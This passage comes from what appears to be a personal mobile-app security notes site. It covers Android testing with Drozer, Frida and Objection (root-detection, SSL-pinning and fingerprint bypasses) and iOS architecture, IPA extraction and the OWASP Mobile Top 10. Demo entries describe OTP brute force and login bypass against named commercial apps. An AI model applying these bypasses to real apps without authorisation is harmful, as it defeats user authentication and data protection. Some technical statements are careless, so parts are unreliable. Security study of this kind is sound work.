<code>.json,.xml</code> files for credentials.</li> <li>Many apps contain hidden features, search for develop, debug, fake, test in the app binary.</li> <li>Check for different <code>.plist</code> files such as <code>GoogleService-Info.plist</code>. These might contain juicy API keys.</li> </ul>"},{"location":"MobileSec/Android/#drozer","title":"Drozer","text":"<ul> <li>Drozer is a security testing framework for Mobile Application, Allows you to use, share and exploit Android exploits, Open-source and simple to install.</li> <li>It helps you to deploy a drozer Agent to a device through exploitation or social engineering.</li> </ul> Server Agent Server Agent Command <code>drozer console connect --server &lt;IP&gt;:31415</code> Open Agent app in phone turn server <ul> <li>Commands After setting up the Drozer server<ul> <li>We can tweak the Exported, debuggable options with Drozer</li> <li>When activity exported then their might be chance of other application might use this app activity.</li> <li>Using this we open the certain activities with navigating the app menu <pre><code>dz&gt;run app.package.list\nrun app.package.list -f diva # Filter the diva application, Above options take lot of time if know the package name\nrun app.package.info -a jakhar.aseem.diva # package information\nrun app.package.debuggable # list of packages debuggable\nrun app.package.manifest jakhar.aseem.diva # Gives the manifest file\nrun app.package.attacksurface jakhar.aseem.diva # gives attack surface of application\n\n# Activities \nrun app.activity.info -a jakhar.aseem.diva\nrun app.activity.start --component jakhar.aseem.diva jakhar.aseem.diva.MainActivity\nrun app.activity.start --component jakhar.aseem.diva jakhar.aseem.diva.APICredsActivity\nrun app.activity.start --component jakhar.aseem.diva jakhar.aseem.diva.APICreds2Activity\n\n# Content providers\nrun scanner.provider.finduris -a jakhar.aseem.diva # Found 4 query them 2\nrun app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes/   # given the information table columns(_id, title, note)\nrun app.provider.insert content://jakhar.aseem.diva.provider.notesprovider/notes/ # Done\nrun app.provider.insert content://jakhar.aseem.diva.provider.notesprovider/notes/ --string title Hello --string note Hello # Done\nrun app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes/  # Able to see the above inserted Hello, Hello information\nrun app.provider.delete content://jakhar.aseem.diva.provider.notesprovider/notes/ --selection \"title=?\" --selection-args home # Done\nrun app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes/ # Deleted the Home row in the table\n</code></pre></li> </ul> </li> </ul>"},{"location":"MobileSec/Android/#firebase-real-time-database","title":"Firebase Real-time Database","text":"<ul> <li>Firebase is a NoSQL cloud-based database, is stored in <code>.json</code> format and synchronized in real time.</li> <li>If you find a firebase string, there might be chance of that it might be misconfigured, It looks like this <code>https://xyz.firebaseio.com/.json</code></li> <li>If the response is:<ul> <li>Permission Denied: This means that you cannot access it, so it's well configured</li> <li>Null response or a bunch of JSON data: This means that the database is public and you at least have read access.</li> </ul> </li> </ul>"},{"location":"MobileSec/Android/#pasteboard","title":"Pasteboard","text":"<ul> <li>An application can also prevent its users to copy sensitive data to the clipboard which is recommended.</li> <li>For Dynamic analysis, Objections pasteboard monitor can be used.<ul> <li>First start the frida to check list apps open in the mobile if not open your app <code>frida-ps -Ua</code></li> <li>Objection command <code>objection --gadget jakhar.aseem.diva explore</code></li> <li>In the objection terminal <code>android clipboard monitor</code> enter some information on app then copy the info then you can sse that info in the objection terminal</li> </ul> </li> </ul>"},{"location":"MobileSec/Android/#hot-patchingenforced-updating","title":"Hot Patching/Enforced Updating","text":"<ul> <li>Developers can remotely patch all installations of their app instantly without having to resubmit the application to the App store and wait until it's approved.</li> <li>Applications should be forced updated.</li> <li>Try downloading an older version of the application and check if it allows forced update or not.</li> </ul>"},{"location":"MobileSec/Android/#webview-related-vulnerabilities","title":"WebView Related Vulnerabilities","text":"<ul> <li>WebView file access is enabled by default. Since API3(Cupcake 1.5) the method <code>setAllowFileAccess()</code> is available for explicitly enabling or disabling it. </li> <li>Applications should forced updated. The WebView needs to use a file URL schema. e.g., <code>file:///etc/passwd</code> to access the file.</li> <li>If Javascript is enabled in WebView, we can try to perform javascript based attacks such as XSS.</li> <li>The Remote WebView debugging allow to access the WebView with the chrome Developer Tools. The device needs to be accessiable by the PC(via USB, local emulator, local network) and running the debuggable WebView, then access chrome://inspect/#devices:</li> </ul>"},{"location":"MobileSec/Android/#dynamic-analysis","title":"Dynamic Analysis","text":"<ul> <li>Android SDK Platform- Tools is a component for the Android SDK. They help in the development of the Android Applications.</li> </ul>"},{"location":"MobileSec/Android/#adb","title":"ADB","text":"<ul> <li>ADB(Android Debug Bridge) is a versatile command-line tool that lets you communicate with a device.</li> <li>It lets you interact with the devices and is generally used for debugging purpose, ADB comes installed with platform-tools.<ul> <li>Commands <code>adb shell, pull,push, logcat</code></li> </ul> </li> </ul>"},{"location":"MobileSec/Android/#bypass-root-detection-using-frida-objection","title":"Bypass Root Detection using Frida, Objection","text":"<ul> <li>Frida is a dynamic code instrumentation toolkit that premits you to inject snippets of Javascript or your library into the native application on your operating systems like Windows, iOS, Android and more. Community code Here<ul> <li>SSL Pinning Bypass</li> <li>Fingerprint Bypass</li> </ul> </li> <li>Objection: Is a runtime mobile exploration toolkit, powered by Frida built to help you access the security posture of the mobile applications, without needing a jailbreak.<ul> <li>SSL Pinning bypass</li> <li>Root Bypass</li> <li>Capture Screenshots</li> </ul> </li> <li>Setting up Frida and Objection<ul> <li><code>python3 -m pip install frida objection frida-tools</code></li> <li><code>adb shell getprop ro.product.cpu.abi</code> =&gt; Get the device configuration</li> <li>Download the device configuration server file Here</li> <li>Push the server file using <code>adb push C:\\ADB\\frida-server /data/local/tmp</code></li> <li>Set up permissions using adb shell <code>chmod 777 /data/local/tmp/frida-server</code></li> </ul> </li> <li>Root Detection<ul> <li>Rooting is the process of unlocking an Android device in order to access higher administrative privileged controls.</li> <li>Most Android developers, do not want their applications to be running on a rooted device, since this could lead to security concerns and impacts.</li> <li>However, Root Detection is not strongly implemented.</li> <li>This is the same case with Emulator Detection as well.</li> </ul> </li> <li>Bypassing Root Detection using Frida<ul> <li>Check the App Package ID using <code>frida-ps -Ua</code></li> <li>Hook the Jailbreak frida script using <code>frida -U -f package_id -l root.js</code></li> <li>Same way we can bypass the Emulator detection as weel.</li> </ul> </li> <li>Root Detection Bypass using Medusa<ul> <li>Medusa is a flexible framework that automates the procedures and methods used in the dynamic analysis of Android applications, Link is here</li> <li>Launch Medusa and run the these below commands<ul> <li>run this <code>python3 medusa.py</code>, search <code>anti_debug</code>, use <code>helpers/anti_debug</code>, then <code>compile</code> package id <code>run -f package_id</code></li> </ul> </li> </ul> </li> <li>Root Detection Bypass using Objection<ul> <li>Objection is a runtime mobile exploration toolkit, To install objection simply run command <code>pip3 install objection, frida, frida-tools</code></li> <li>Explore the package using <code>objection --gadget package_name explore</code></li> <li>Disable jailbreak detection using <code>android root diable</code> still giving the device rooted.</li> <li>So try to find the which class <code>doesSUexit</code> is responsiable in the Jadx-gui<ul> <li>Use the command in objection <code>android hooking set return com.android.insecurebankv2.postLogin.doesSUexit false</code> Device not rooted</li> </ul> </li> </ul> </li> <li>Root Detection Bypass using Magisk<ul> <li>MagiskHide module in the Magisk application, This can only be done if the phone is rooted using Magisk Module.</li> <li>Enable the MagiskHide module from the app settings.</li> <li>Magisk App &gt; v23.0 provides an alternative feature -Zygisk Denylist</li> <li>Enable Zygisk, DenyList from the app settings.</li> </ul> </li> </ul>"},{"location":"MobileSec/Android/#ssl-pinning-fringerprint-bypass-using-frida-objection","title":"SSL Pinning &amp; Fringerprint Bypass  using Frida, Objection","text":"<ul> <li>SSL certificate pinning is a technique using which only known certificate are trusted.</li> <li>This security measure pins the identity of trustworthy certificate on mobile apps and blocks unknown documents from the suspicious servers.</li> <li>However, SSL pinning is not strongly implemented.</li> <li>Bypassing SSL Pinning using Frida<ul> <li>Check the App Package ID using <code>frida-ps -Ua</code></li> <li>Hook the SSL pinning Bypass frida script using <code>frida -U -f package_id -l sslpinning.js</code></li> </ul> </li> <li>Bypassing SSL Pinning using Objection<ul> <li>Objection is a runtime mobile exploration toolkit, To install simply run the command <code>pip3 install objection, frida, frida-tools</code></li> <li>Explore the package using <code>objection --gadget package_name explore</code></li> <li>Diable SSL pinning Bypass using <code>android sslpinning disable</code> </li> </ul> </li> <li>SSL Pinning Bypass by overwriting packaged CA Certificate with custom CA Certificate<ul> <li>A custom certificate chain is being distributed with an application, extracting the APK and overwriting the provided CA with our custom CA will let you bypass SSL Pinning.</li> <li>Opening the APK with a tool such as APK studio makes the presence of certificate bundled with the deployed application obvious. The certificate are loacted under the <code>assets</code> directory</li> <li>Two methods:<ul> <li>Tool <code>apk-mitm</code> Link</li> </ul> </li> </ul> </li> <li>SSL Pinning Bypass using android-unpinner<ul> <li>This tool removes certificate pinning from APKs, Install the tool using Github Link</li> <li>Launch the script using <code>android-unpinner all httptoolkit-pinning-demo.apk</code></li> </ul> </li> <li>Fingerprint Bypass<ul> <li>Some applications use fingerprints, in oder to verify the user details.</li> <li>Although this method helps users save their time of entering USernames and Passwords, but the fingerprint is also bypass-able.</li> <li>THe root cause is the response of the Fingerprint which is either false or 0 for un-match fingerprints.</li> <li>Frida manipulates and reverse the response i.e.,<ul> <li>false =&gt; ture</li> <li>0 =&gt; 1</li> </ul> </li> </ul> </li> <li>Check the App Package ID using <code>frida-ps -Ua</code></li> <li>Hook the fingerprint Bypass frida script using <code>frida -U -f package_id -l fingerprint.js --no-pause</code></li> </ul>"},{"location":"MobileSec/Android/#non-rooted-frida-and-objection","title":"Non Rooted Frida and Objection","text":"<ul> <li>Patch the application <code>objection patchapk -s &lt;APPNAME.apk&gt;</code> it will check phone version according it build the application.</li> <li>After installing the in the phone <code>objection explore</code> in theriminal app will work, able to capture the request.</li> <li>This will take the screenshot of the application <code>android ui screenshot png</code> </li> </ul>"},{"location":"MobileSec/Android/#progressive-web-application-attacks","title":"Progressive Web Application Attacks","text":"<ul> <li>Progressive Web Applications(PWAs) are apps built with web technologies that we probably all know and love, like HTML, CSS, and JavaScript. But they have the feel and functionality of an actual native app.</li> <li>A Native App is a software application built in a specific programming language for a specific device platform. Either IOS or Android.</li> <li>Ex:- React, Flutter</li> <li>Bypassing Root &amp; SSL Pinning in PWAs<ul> <li>Same scripts as normal root detection can be used Here</li> <li>SSL Pinning Bypass Here</li> <li>Flutter Applications</li> <li>Reflutter for adding IP address after that add the certificate from the Uber-apk-signer, Configure the burp and check the invisiable requests in the burp.</li> </ul> </li> </ul>"},{"location":"MobileSec/Android/#demo","title":"Demo","text":"<ul> <li>Demo 1- Insecure Permissions, FreshtoHome.apk, seen in the MobSF has permissions of <code>Access_COARSE_Location</code> is network based location permission, <code>Access_Fine_Location</code> fine GPS location permissions.</li> <li>Demo 2- Application Signing &amp; Janus vulnerability, Limeroad.apk, App signed with v1, v2. Attacker add dynamic source code to the application without modifing the signature.</li> <li>Demo 3- Hardcoded Credentials, FreshtoHoem.apk and Limeroad.apk, in MobSF has Firebase URl, Google api key, Google crash reporting api keys github</li> <li>Demo 4- Shared Preference, Urbanic.apk has the check in the <code>/data/data/&lt;APP&gt;/shared_prefs</code> path has the <code>.xml</code> files</li> <li>Demo 5- Insufficient Cryptography, FreshtoHome.apk and Limeroad.apk, Has the cryptographic encryption mode <code>CBC with PKCS5/PKCS7</code> padding, MD5, SHA1 algorithm.</li> <li>Demo 6- Non Parameterized SQL Queries, FreshtoHome.apk, has Raw SQL quires cause SQL injection.</li> <li>Demo 7- Insecure Logging, Urbanic.apk, PII information entering into the application visiable in the <code>adb logcat | grep \"keyword_search\"</code></li> <li>Demo 8- WebView XSS, Trengo.apk, Uploaded normal XSS did not work, encoded the XSS payload with <code>.svg</code> so whever we click on this alert poping.</li> <li>Demo 9- Pasteboard Monitor, bislari.apk, start the frida and objection monitor the clipboard in objection terminal, password copy restricted but when view the password then you can view and the objection captured the vulnerability.</li> <li>Demo 10- Screenshot and Background Screen caching, bislari.apk, Run the objection <code>android ui screenshot png</code> it will save into desktop, application vulnerable screenshot.</li> <li>Demo 11- Root Detection and SSL Pinning Bypass, mytoyota.apk, Start the frida server on mobile then identify the frida package name in the PC, frida script to bypass the it bypassed the root detection. SSL pinning is implemented so run the frida SSL bypass script so we can run the app see the communication in the burpsuite further you can play with web attacks.</li> <li>Demo 12- Fingerprint Bypass, AppLock.apk, bypass the fingerprint use the frida script to bypass.</li> <li>Demo 13- No Rate Limit, Binks.apk, First bypass the SLL pinning then Enter mobile number, we send the request to burp intruder try to send the null request send multiple OTPs, recevied multiple OTPs no rate limit for this. Tehn entered any random number for the OTP send the request to intruder it not implemeted rate limiting attacker can try to bruteforce this.</li> <li>Demo 14- Authentication Issues - Status and Response Code Manipulation, sss.apk, frida bypass the SSL pinning, Login with OTP in the burp changed the OTP to random status code give 202 as otp is not correct, changed the status to 202 to 200 able to login with application.</li> <li>Demo 15- Business Logic Issue, mytoyota.apk, SSL Pinning Bypass using the  frida script, Automatically Toyota id is assigned, Only 3 mobile numbers are we can add, send the reques the to repeater enter new mobile number, change the toyota id as well, this information saved on the server, So the validation on client only , no server side.</li> <li>Demo 16- Flutter APK Root &amp; SSL Pinning Bypass, KisanKonnect.apk, FlutterShark shows you all the application running on flutter in your device, reflutter this for traffic monitor embeded the IP address, sign application with uber-apk-signer script, Configure the burp try to capture.</li> </ul>"},{"location":"MobileSec/Android/#bug-bunty-tips","title":"Bug bunty tips","text":"<ul> <li>Link</li> </ul>"},{"location":"MobileSec/Android/#android-file-structure","title":"Android File Structure","text":"<ul> <li>File structure <pre><code>\u251c\u2500\u2500 AndroidManifest.xml   # Application's configuration file; defines permissions, components, and security settings.\n\u2502\n\u251c\u2500\u2500 classes.dex           # Contains the app's compiled Java/Kotlin bytecode. This is the main code file to analyze.\n\u2502\n\u251c\u2500\u2500 lib/                  # Holds native libraries (in .so files) for different CPU architectures.\n\u2502   \u251c\u2500\u2500 arm64-v8a/\n\u2502   \u251c\u2500\u2500 armeabi-v7a/\n\u2502   \u251c\u2500\u2500 x86/\n\u2502   \u2514\u2500\u2500 x86_64/\n\u2502\n\u251c\u2500\u2500 res/                  # Contains compiled resources like layouts, strings, and images.\n\u2502   \u251c\u2500\u2500 anim/\n\u2502   \u251c\u2500\u2500 drawable/\n\u2502   \u251c\u2500\u2500 layout/\n\u2502   \u2514\u2500\u2500 values/\n\u2502\n\u251c\u2500\u2500 assets/               # A raw collection of bundled files (e.g., databases, configuration files).\n\u2502\n\u2514\u2500\u2500 META-INF/             # Contains the app's signature, manifest, and checksums. Critical for integrity verification.\n    \u251c\u2500\u2500 CERT.RSA\n    \u251c\u2500\u2500 CERT.SF\n    \u2514\u2500\u2500 MANIFEST.MF\n</code></pre></li> </ul>"},{"location":"MobileSec/Iphone/","title":"Iphone Security","text":"<ul> <li>Static and Dynamic Analysis</li> <li> <p>Setting up the Mac Environemt environment below are the links IOS Download</p> </li> <li> <p>I thought initially <code>IOS</code> for all of the apple family, but their different names their devices.</p> </li> </ul> Device OS Iphone iOS Ipad IpadOS iWatch WatchOS Macbook macOS"},{"location":"MobileSec/Iphone/#ios-operating-system","title":"IOS Operating System","text":"<ul> <li>IOS is a mobile operating system that Apple Inc. has designed for its iPhones, Second most popular and widely used after android. <p>The structure of the iOS operating system is Layered based. Its communication doesn't occur directly. The layers between the Application Layer and the Hardware layer will help with Communication. The lower level gives basic services on which all applications rely and the higher-level layers provide graphics and interface-related services. Most of the system interfaces comes with a special package called a framework.</p> </li> <li> <p>A framework is a directory containing dynamic shared libraries, such as .files, header files, images, and helper applications that support the library. Every layer has its associated frameworks useful for a developer. </p> </li> <li> <p>CORE OS</p> <ul> <li>It supports 64 bit enables the application to run faster</li> <li>All the IOS thechnologies are built under the lowest level layer i.e. Core OS layer. These technologies include:<ul> <li>Core Bluetooth Framework</li> <li>External Accessories Framework</li> <li>Accelerate Framework</li> <li>Security Service Framework</li> <li>Local Authorization Framework etc    </li> </ul> </li> </ul> </li> <li>CORE SERVICES<ul> <li>Some important frameworks are present in the Core Services layer which helps the iOS os to cure itself and provide better functionality. It is the 2nd lowest layer in the Architecture, below frameworks are present in this layer.</li> <li>Address Book Framework: The Address Book Framework provides access to the contact details of the user.</li> <li>Cloud Kit Framework: This framework provides a medium to transfer data between your app and iCloud.</li> <li>Core Data Framework: It is the technology used to handle the data model of a Model View Controller app.</li> <li>Core Foundation Framework: This framework offers data management and service features for iOS applications.</li> <li>Core Location Framework: This framework helps in delivering location and heading information to the application.</li> <li>Core Motion Framework: All the motion-based data on the device is accessed with the help of the Core Motion Framework.</li> <li>Foundation Framework: Objective C covering too many of the features found in the Core Foundation framework.</li> <li>HealthKit Framework: This framework handles the health-related information of the user.</li> <li>HomeKit Framework: This framework is used for talking with and controlling connected devices with the users home.</li> <li>Social Framework: It is simply an interface that will access users' social media accounts.</li> <li>StoreKit Framework: It provides support for purchasing content and services from within iOS apps.</li> </ul> </li> <li>MEDIA LAYER<ul> <li>This layer helps, Enable all graphics video, and audio technology of the system. This is the second layer in te architecture. The different framework of MEDIA layer are:</li> <li>ULKit Graphics: This framework provides support for designing images and animating the view content.</li> <li>Core Graphics Framework: This framework support 2D vector and image-based rendering and it is a native drawing engine for iOS.</li> <li>Core Animation: This framework provides the optimum animation experience of the apps in iOS.</li> <li>Media Player Framework: This framework supports the playing of the playlist. It enables the user to use their iTunes library.</li> <li>AV Kit: This framework offers a number of easy-to-use interfaces for video presentation and recording, and even playback of audio and video.</li> <li>Open AL: This framework is also an Industry Standard Technology for Audio provision.</li> <li>Core Images: This framework offers advanced support for motionless images.</li> <li>GL Kit: This framework manages advanced 2D and 3D rendering by hardware-accelerated interfaces.</li> </ul> </li> <li>COCOA TOUCH (APPLICATION LAYER)<ul> <li>COCOA Touch is also known as the application layer which acts as an interface for the user to work with the iOS Operating system. It supports touch and motion events and many more features. The COCOA TOUCH layer provides the following frameworks :</li> <li>EvenKit Framework: This framework shows a standard system interface using view controllers for viewing and changing events.</li> <li>GameKit Framework: This framework even allows users to share game related data online via a Game Center.</li> <li>MapKit Framework: This framework provides a scrollable map that may be inserted into the user interface of the app.</li> <li>PushKit Framework: This framework provides for registration.</li> </ul> </li> </ul>"},{"location":"MobileSec/Iphone/#ios-applications","title":"iOS Applications","text":"<ul> <li>iOS Applications are zipped packages under the extension <code>.ipa</code> A completed application ready to install is called a bundle.</li> <li>Decompressing an IPA will have Name.app which contains following files:<ul> <li>Info.plist: Specific Application Components</li> <li>_CodeSignature/: Plist file with signature over all files in the bundle.</li> <li>Assets.car: Zipped file containing assets.</li> <li>Frameworks/: Folder containing framework files</li> <li>Core Data: Used to save your application's permanent data for offline use, to cache temporary data, and to add undo functionality to your app on a single device.</li> <li>Pkginfo: Alternative way to specify the type and creator code of your application or bundle.</li> </ul> </li> </ul> Name Description Info.plist is a <code>xml</code> file, Consists of Structured <code>key-value pairs</code> App Permissions:<code>UageDescription</code>, Custom URL schemas:<code>CFBundleURLTypes</code>, Exported/Imported custom document types:<code>UTExportedTypeDeclarations, UTImportedTypeDeclarations</code>, App Transport Security:<code>NSAppTransportSecurity</code> UDID Unique device identifier 40 digit unique sequence of letters and numbers to identify any iOS device, UDID found on the finder app on the macOS, UDID important gives the details of iOS device details. On-device Shell you can get a shell terminal on your iphone using some tweaks such as Mterminal, this can perform all the commands as the computer Transferring data between device to PC Command <code>scp -P 22 root@&lt;ip_address&gt;:&lt;path_of_file&gt; &lt;destination_path&gt;</code>"},{"location":"MobileSec/Iphone/#extracting-ipa-file","title":"Extracting IPA file","text":"<ul> <li>Most of the times you don't get the source code of the from the developer, Since extraction is important.</li> <li>They encrypted with strong encryption key, Se we have the 3 types</li> <li>frida-ios-dump Code<ul> <li>Install frida on device, Install prerequsits <code>sudo pip install -r requirements.txt --upgrade</code>,  keep this seperate teriminal in  command <code>iproxy 2222 22</code>(any port), Command <code>run ./dump.py &lt;App_Name&gt; or &lt;Bundle Identifier&gt;</code> </li> </ul> </li> <li>Filza (Download from the Third-party AppStore <code>Sileo</code>)<ul> <li>Go to Filza then <code>/var/container/Bundle/Application/&lt;App_Name&gt;</code>, Create copy of the app you want, copy this inside the payload(You need to create) folder, then paste the inside the payload folder, then make zip of the file and then chnage it to the .ipa, then transfer scp -P 22 root@: <li>iMazing<ul> <li>Toolket perform actions using <code>https://imazing.com/download</code>, You can only run on the same device of UDID, Not another IOS device.</li> </ul> </li> <li>Sideloading Install apps using 3U tools<ul> <li>Sideloading is a method of installing applications by manually signing them.</li> <li>There are various applications which do this, but most common one used is AltStore.</li> <li>AltStore signs the IPA file and sideloads it.</li> </ul> </li>"},{"location":"MobileSec/Iphone/#ios-basics-for-mitigations","title":"iOS Basics for Mitigations","text":"<ul> <li>Basics for Mitigations</li> </ul>"},{"location":"MobileSec/Iphone/#data-protection-in-ios","title":"Data Protection in iOS","text":"<ul> <li>How the <code>File Contents</code> is encrypted in the iOS device  </li> <li>Complete Protection <code>NSFileProtectionComplete</code> - it's derived from the user passcode of the device UID protects the class key, Once the device is locked class key will wiped off from the memory, It will inaccessible until the user unlocks the device.</li> <li>Protected Unless Open <code>NSFileProtectionCompleteUnlessOpen</code> - It's same like but the class key is never expires after devoce locks, still the file contents accessable for the apps running in the background.</li> <li>Protected Until First User Authentication <code>NSFileProtectionCompleteUntilFirstUserAuthentication</code> - This file can be accessed as soon as the user unlocks the device for the first time after booting. It can be accessed even if the user subsequently locks the device and class key is not removed from the memory.</li> <li>No Protection <code>NSFileProtectionNone</code> - The key for this protcetion class is protected with the UID only. The class key is stored in \"Effaceable Storage\", which is a region of flash memory on the iOS device that allows the storage of small amounts of data. This protection class exists for fast remote wiping (Immediate deletion of the class key, which makes the data inaccessible).</li> </ul>"},{"location":"MobileSec/Iphone/#keychain","title":"Keychain","text":"<ul> <li>Is a encrypted container, It will be accessiable autorized apps or same app can retrive the contents.</li> <li>The iOS it own password for the keychains stores encypted format.</li> <li>The password encrypted with AES created by PBKDF2 with Salt(device UID) to decrypt file contents.<ul> <li><code>kSecAccessControlPasscode</code>: Access the item via a passcode.</li> <li><code>kSecAccessControlDeviceBiometryAny</code>:Access the item via one of the fingerprints registed to Touch ID. Adding or removing a fingerprint won't invalidate the item.</li> <li><code>kSecAccessControlBiometryCurrentSet</code>: Access the item via one of the fingerprints registered to Touch ID. Adding or removing a fingerprint will invalidate them item.</li> <li><code>kSecAccessControlUserPresence</code>:: Access the item via either one of the registered foingerprints (using Touch ID) or default to the passcode.</li> </ul> </li> </ul>"},{"location":"MobileSec/Iphone/#application-capabilities-purpose-strings","title":"Application Capabilities &amp; Purpose Strings","text":"<ul> <li>Each app  has a unique home directory and is sandboxed, so that they cannot access protected system resources or files stored by the system or by other apps.</li> <li>Purpose Strings or usage description strings are custom texts that are offered ti users in the system's permission request alert when requesting permission to access protected data or resources.</li> <li>These can be found inside the <code>Info.plist</code> file Info.plist<pre><code>&lt;key&gt;NSAppTransportSecurity&lt;/key&gt;\n    &lt;dict&gt;\n        &lt;key&gt;NSAllowsArbitraryLoads&lt;/key&gt;\n        &lt;true/&gt;\n    &lt;/dict&gt;\n    &lt;key&gt;NSCameraUsageDescription&lt;/key&gt;\n    &lt;string&gt;To demonstrate the misuse of Camera, please grant it permission once.&lt;/string&gt;\n</code></pre></li> </ul>"},{"location":"MobileSec/Iphone/#ios-app-extenions","title":"iOS App Extenions","text":"<ul> <li> <p>Assume <code>Host App</code> is your notes, want to share with your friend <code>App Extension</code> is your sharing app lime Messages so notes copy the contents in the notes to send whomever your like. </p> </li> <li> <p>App extenions let apps offer custom functionality and content to users while they're interacting with other apps or the system. Some of them are:</p> <ul> <li>Custome Keyboards: Replace the iOS system keyboard with a custom keyboard for use in all apps.</li> <li>Share: Post to a sharing website or share content with others.</li> <li>Today: Also called widgets, thay offer content or perform quick tasks in the Today view of Notification Center.</li> </ul> </li> </ul>"},{"location":"MobileSec/Iphone/#ios-device-management","title":"iOS Device Management","text":"<ul> <li>From iOS verion 6, there is <code>built-in support for device management</code> capabilities with fine grain controls that allows an organization to control the corporate appl;e devices.</li> <li>The user can see the installed policies in settings -&gt; General -&gt; Profile and Device Management</li> <li>The profile are tied to the deviceID, signed and encrypted by the MDM server and temper proof. They cannot be removed without losing all the corporate data.</li> </ul>"},{"location":"MobileSec/Iphone/#mobile-2016-owasp-top-10","title":"Mobile 2016 OWASP Top 10","text":""},{"location":"MobileSec/Iphone/#m1-improper-platform-usage","title":"M1: Improper Platform Usage","text":"<ul> <li>Misuse of a platform feature or failure to use platform security controls</li> <li>Examples include<ul> <li>Platform Permissions</li> <li>Misuse of TouchID</li> <li>Misuse of Keychain</li> <li>Violation of guidelines</li> </ul> </li> </ul>"},{"location":"MobileSec/Iphone/#m2-insecure-data-storage","title":"M2: Insecure Data Storage","text":"<ul> <li>Insecure data storage vulnerabilities occur when development teams assume that users or malware will not have access to a mobile device's filesystem and subsequent sensitive information in data-stores on the device Example include<ul> <li>Sensitive data stored in SQLite</li> <li>Sensitive data stored in Log Files</li> <li>Improper authentication of Firebase</li> </ul> </li> </ul>"},{"location":"MobileSec/Iphone/#m3-insecure-communication","title":"M3: Insecure Communication","text":"<ul> <li>Mobile applications frequently do not protect network traffic. They may use SSL/TLS during authentication but not elsewhere. This inconsistency leads to the risk of exposing data and session IDs to interception. The use of transport security does not mean the app has implemented it correctly.<ul> <li>Usage of older SSL/TLS Libraries</li> <li>SSL Pinning Bypass</li> <li>Privacy Information Leakage</li> </ul> </li> </ul>"},{"location":"MobileSec/Iphone/#m4-insecure-authenication","title":"M4: Insecure Authenication","text":"<ul> <li>Poor or missing authentication schemes allow an adversary to anonymously execute functionality within the mobile app or backend server used by the mobile app.<ul> <li>Weak password policy</li> <li>Leaking OTP in response</li> <li>Leakage of sessions IDs</li> </ul> </li> </ul>"},{"location":"MobileSec/Iphone/#m5-insufficient-cryptography","title":"M5: Insufficient Cryptography","text":"<ul> <li>An adversary can return encrypted code or sensitive data to its original unencrypted form due to weak encryption algorithms or flaws within the encryption process.<ul> <li>Using no Encryption techniques</li> <li>Using weak hashing algorithms like MD5</li> <li>Using weak encryption algorithms like SHA-1</li> </ul> </li> </ul>"},{"location":"MobileSec/Iphone/#owasp-remaining-m6-m7-m8-m9-m10","title":"OWASP Remaining M6, M7, M8, M9, M10","text":"<ul> <li>M6: Insecure Autorization: Autorization is the act of checking that the identified individual has the permissions necessary to perform the act. Authorisation checks should always immediately follow authentication of then an incoming request from a mobile device.<ul> <li>Hidden Endpoints</li> <li>IDORs</li> </ul> </li> <li>M7: Client Code Quality: Code quality issues are found frequently within most mobile code. The primary goal is to execute foreign code within the mobile code's address space.<ul> <li>Memory Leaks</li> <li>Buffer Overflow</li> </ul> </li> <li>M8: Code Tempering: An adversary modify code via malicious forms of the apps hosted in third-party app stores. The attacker may also trick the user into installing the app via phishing attacks. Mitigation is <code>Signature check from the developer</code><ul> <li>Changing the certificate to bypass SSL Pinning.</li> <li>Changing the API version.</li> </ul> </li> <li>M9: Reverse Engineering: All mobile code is susceptible to reverse engineering. Code written in languages/frameworks that allow for dynamic introspection at runtime (Java, .NET, Objective C, Swift) are particularly at risk for reverse engineering.<ul> <li>Reveal information about backend server</li> <li>Recon servers</li> </ul> </li> <li>M10: Extraneous Functionality: Functionality that exposes information related to back-end test, demo, staging, or UAT environemts should not be included in a production build.<ul> <li>Downloading configuration files.</li> <li>Examining log files.</li> </ul> </li> </ul>"},{"location":"MobileSec/Iphone/#static-analysis-ios","title":"Static Analysis iOS","text":"<ul> <li>Find in the source code of the application certain hard-coded key, Insecure permissions and authentication, Insecure encryption and hashing without running the application</li> <li>Static analysis is about decompiling the IPA file and checking out for code related vulnerabilities.<ul> <li>Checking out for file permissions</li> <li>Checking out for file permissions</li> <li>Checking out for insecure API, Functions</li> </ul> </li> </ul>"},{"location":"MobileSec/Iphone/#mobsf-ios","title":"MobSF iOS","text":"<ul> <li>Mobile Security Framework(MobSF), Its an automated all-in-one mobile application penetesting framework, Helps to perform runtime assessment.</li> <li>Reports can be downloaded in PDF format and Open-source MobSF tool.<ul> <li>Info.plist security issue permission camera, Lack TLS </li> <li>Binary insecure APIs <code>_fopen, _strncpy, _memcpy, _strcpy, _printf, _strlen</code></li> <li>Binary functions <code>_random</code>, <code>_malloc</code> leads to memory leakage instead of calloc</li> <li>Binary Logging functions <code>_NSLog</code> function for logging</li> <li>WebView based on the sensitive information</li> </ul> </li> <li>Frida, Objection tools for the File system analysis</li> </ul>"},{"location":"MobileSec/Iphone/#app-log-analysis","title":"App Log Analysis","text":"<ul> <li>To check for application logs for sensitive data following needs to be performed:<ul> <li>Goto Xcode -&gt; Devices and Simulators -&gt; View device logs to see the logs.</li> <li>Grep the logs for sensitive data files</li> <li>If Linux <code>idevicesyslog | grep &lt;your_app&gt;</code></li> </ul> </li> </ul>"},{"location":"MobileSec/Iphone/#hardcoded-credentials-mobsf","title":"Hardcoded Credentials: MobSF","text":"<ul> <li>Many developers hard coded credentials in the app, search for secret, crypt, private, token etc.</li> <li>Many apps use third party backend systems, analyse and .json and .xml files for credentials.</li> <li>Many apps contain hidden features, search for develop, debug, fake, test in the app binary.</li> <li>Check for different .plist files such as <code>GoogleService-Info.plist</code>. These might contain juicy API keys.</li> </ul>"},{"location":"MobileSec/Iphone/#sqlite-database-core-data","title":"SQLite Database: Core Data","text":"<ul> <li>Core Data is a framework for managing the model layer of objects in your application.</li> <li>Core Data can use SQLite as its persistent store.</li> <li>SQLite Core Data information of an application in the path oen using filza application to this path <code>/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application</code> support.</li> <li>Note: If SQLite Database can be opened and sensitive information can be accessed then a misconfiguration can be found.</li> </ul>"},{"location":"MobileSec/Iphone/#other-sqlite-databases","title":"Other SQLite Databases","text":"<ul> <li>There is a chance that other SQLite Databases can also be found in an iOS application such as YapDatabases, Couchbase.</li> <li>These may be storing sensitive data on them and leaving it unencrypted.</li> <li>The can be found inside the application folder:<ul> <li><code>/private/var/mobile/Containers/Data/Application/{APPID}</code></li> </ul> </li> <li>You 